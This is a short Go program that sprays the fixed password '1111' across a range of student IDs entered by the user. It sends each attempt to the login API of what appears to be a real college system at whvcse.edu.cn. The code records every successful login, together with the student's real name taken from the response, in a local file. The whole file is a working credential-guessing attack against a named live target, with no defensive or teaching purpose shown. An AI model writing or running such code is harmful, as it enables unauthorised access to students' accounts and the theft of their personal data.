package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type studentInfoJSON struct {
	UID          string `json:"uid"`
	UserImageURL string `json:"userImageURL"`
	UserName     string `json:"userName"`
	UserEmail    string `json:"userEmail"`
	TrueName     string `json:"trueName"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

func main() {
	var (
		userStart int
		userStop  int
		password  string
		fileName  string
	)
	fileName = "Success.txt"
	creatFile, err := os.Create(fileName)
	if err != nil {
		fmt.Print("File exsisted")
	}
	defer creatFile.Close()
	fmt.Printf("Type Start ID:\t")
	fmt.Scan(&userStart)
	fmt.Printf("Type Stop ID:\t")
	fmt.Scan(&userStop)
	password = "1111"
	for i := userStart; i <= userStop; i++ {
		tryingAndSaving(i, password, fileName)
	}
	fmt.Print("Press Enter to exit")
	A := 100
	fmt.Scan(&A)
	_ = A

}

//弱口令尝试
func tryingAndSaving(user int, password, fileName string) {
	//文件操作
	//尝试登陆
	url := "http://wrggka.whvcse.edu.cn/api/M_User/Login?username=" + strconv.Itoa(user) + "&password=" + password + "&accessKey=1&secretKey=1"
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Requesting too fast!!!\n")
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "\"status\":\"1\"") {
		var userInfo studentInfoJSON //解析JSON数据
		json.Unmarshal(body, &userInfo)
		studentName := userInfo.TrueName
		Date := strconv.Itoa(user) + "---------" + password + "---------" + studentName
		writeFile, _ := os.OpenFile(fileName, os.O_WRONLY|os.O_APPEND, 0664)
		writeFile.WriteString(Date + "\n")
		defer writeFile.Close()
		fmt.Print(Date + "\n")
	}
}
